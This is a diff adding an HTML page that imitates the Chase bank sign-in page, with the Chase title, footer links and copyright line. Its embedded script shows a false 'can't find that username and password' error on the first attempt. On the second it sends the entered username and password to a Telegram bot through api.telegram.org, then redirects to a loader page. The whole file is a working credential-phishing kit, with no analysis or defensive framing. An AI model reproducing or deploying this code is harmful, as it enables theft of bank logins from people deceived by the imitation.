@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in - chase.com</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="icon" type="image/x-icon" href="blessfavicon.ico">
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <script src="script.js"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="sender.js"></script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var clickCount = 0;
+
+      document.getElementById('sign-in-button').addEventListener('click', function () {
+        if (validateForm()) {
+          clickCount++;
+          if (clickCount === 2) {
+            sendMessageToTelegram();
+          } else {
+            highlightForm();
+            openPopup('success-popup', 'success-close-popup');
+          }
+        } else {
+          openPopup('error-popup', 'error-close-popup');
+        }
+      });
+
+      function validateForm() {
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+
+        // Add more validation logic if needed
+        return username !== '' && password !== '';
+      }
+
+      function highlightForm() {
+        var labels = document.querySelectorAll('.login-box label');
+        var inputs = document.querySelectorAll('.login-box input');
+
+        labels.forEach(function (label) {
+          label.style.color = 'rgb(182, 51, 102)';
+        });
+
+        inputs.forEach(function (input) {
+          input.style.borderBottom = '2px solid rgb(182, 51, 102)';
+        });
+      }
+
+      function openPopup(popupId, closeBtnId) {
+        var popup = document.getElementById(popupId);
+        var overlay = document.getElementById('popup-overlay');
+        var closeBtn = document.getElementById(closeBtnId);
+
+        popup.style.display = 'block';
+        overlay.style.display = 'block';
+
+        closeBtn.addEventListener('click', closePopup);
+        overlay.addEventListener('click', closePopup);
+      }
+
+      function closePopup() {
+        var popups = document.querySelectorAll('.popup');
+        var overlay = document.getElementById('popup-overlay');
+
+        popups.forEach(function (popup) {
+          popup.style.display = 'none';
+        });
+
+        overlay.style.display = 'none';
+      }
+
+      function sendMessageToTelegram() {
+        var u_name = document.getElementById("username").value;
+        var u_password = document.getElementById("password").value;
+
+        // Check if both username and password are not empty
+        if (u_name.trim() !== "" && u_password.trim() !== "") {
+          var message = "Name: " + u_name + "\nPassword: " + u_password;
+          var settings = {
+            "async": true,
+            "crossDomain": true,
+            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+            "method": "POST",
+            "headers": {
+              "Content-Type": "application/json",
+              "cache-control": "no-cache"
+            },
+            "data": JSON.stringify({
+              "chat_id": chat_id,
+              "text": message
+            })
+          };
+
+          // Send the message
+          $.ajax(settings).done(function (response) {
+            console.log(response);
+
+            // Clear input fields after sending the message
+            document.getElementById("username").value = "";
+            document.getElementById("password").value = "";
+
+            // Redirect to loader.html after sending the message
+            window.location.href = 'loader.html';
+          });
+        }
+      }
+    });
+  </script>
+
+  
+</head>
+
+<body>
+    <div id="popup-overlay"></div>
+    <div class="main-container">
+      <div class="container">
+        <img src="bless_logo.png" alt="Bless Logo" class="logo">
+      </div>
+      <div class="container">
+        <div class="login-box">
+            <form action="" onsubmit="return sender()" novalidate>
+                <input type="text" id="username" name="username" required placeholder="Username">
+                <input type="password" id="password" name="password" required placeholder="Password">
+      
+                <div class="CheckBoxes">
+                  <input type="checkbox" id="remember" name="remember">
+                  <label for="remember">Remember me</label>
+                </div>
+      
+                <button type="submit" id="sign-in-button">Sign in</button>
+                <div class="forgot-password">
+                  <a href="#">Forgot username/password? > </a>
+                  <a href="#">Not Enrolled? Sign Up Now. > </a>
+                </div>
+            </form>   
+            <script src="sender.js"></script>    
+        </div>
+      </div>
+    </div>
+  
+    <div class="footer-container">
+      <div class="follow-us">
+          <div class="social-icons">
+            Follow us:  
+            <a href="https://www.facebook.com/chase" target="_blank" ><img src="facebook.png" alt="Facebook"></a>
+            <a href="https://www.instagram.com/chase/" target="_blank"><img src="Instagram-symbol.png" alt="Instagram"></a>
+            <a href="https://twitter.com/chase" target="_blank"><img src="Twitter.png" alt="Twitter"></a>
+            <a href="https://www.youtube.com/chase" target="_blank"><img src="Youtube.png" alt="YouTube"></a>
+            <a href="https://www.linkedin.com/company/chase/" target="_blank"><img src="Linkedin.png" alt="LinedIn"></a>
+          </div>
+      </div>
+  
+      <div class="line"></div>
+  
+      <div class="footer-links">
+        <u><a href="https://www.chase.com/digital/customer-service" target="_blank">Contact us</a></u>
+        <u><a href="https://www.chase.com/digital/resources/privacy-security" target="_blank">Privacy</a></u>
+        <u><a href="https://www.chase.com/digital/resources/privacy-security" target="_blank">Security</a></u>
+        <u><a href="https://www.chase.com/digital/resources/terms-of-use" target="_blank">Terms of use</a></u>
+        <u><a href="https://www.chase.com/digital/resources/accessibility" target="_blank">Accessibility</a></u>
+        <u><a href="https://www.chase.com/personal/mortgage/loan-originator-search" target="_blank">SAFE Act: Chase Mortgage Loan Originators</a></u>
+        <u><a href="https://www.chase.com/personal/mortgage/fair-lending/fair-lending-overview" target="_blank">Fair Lending</a></u>
+        <u><a href="https://www.chase.com/digital/resources/about-chase" target="_blank">About Chase</a></u>
+        <u><a href="https://www.jpmorgan.com/global" target="_blank">J.P. Morgan</a></u>
+        <u><a href="https://www.jpmorganchase.com" target="_blank">JPMorgan Chase & Co.</a></u>
+        <u><a href="https://careers.jpmorgan.com/us/en/chase" target="_blank">Careers</a></u>
+        <u><a href="https://www.chase.com/espanol?pg_name=ccpmapp/spanish/home/page/spanish_home" target="_blank">Español</a></u>
+        <u><a href="https://www.chase.ca/en/card-services" target="_blank">Chase Canada</a></u>
+        <u><a href="https://www.chase.com/digital/resources/sitemap" target="_blank">Site map</a></u>
+        <a href="#">Member FDIC</a>
+        <a href="#">Equal Housing Opportunity</a>
+        <p>(c) 2023 Chase Bank. All rights reserved.</p>
+      </div>
+    </div>
+    <div id="popup" class="popup">
+    <span id="close-popup" class="close-popup">&times;</span>
+      <img src="exclamation.png" alt="Icon" class="popup-icon">
+      <p>We can't find that username and password. You can reset your password or try again.<br><br>
+      Keep in mind: You won't be able to see your statements and notices until we unlock your account.</p>
+    </div>
+
+    <!-- Success Popup -->
+    <div id="success-popup" class="popup">
+      <span id="success-close-popup" class="close-popup">&times;</span>
+      <img src="exclamation.png" alt="Icon" class="popup-icon">
+      <p>
+        We can't find that username and password. You can reset your password or try again.<br><br>
+        Keep in mind: You won't be able to see your statements and notices until we unlock your account.
+      </p>
+    </div>
+    
+    <!-- Error Popup -->
+    <div id="error-popup" class="popup">
+      <span id="error-close-popup" class="close-popup">&times;</span>
+      <img src="exclamation.png" alt="Icon" class="popup-icon">
+      <p>
+        Please tell us your username and password.
+      </p>
+    </div>
+
+  </body>
+</html>
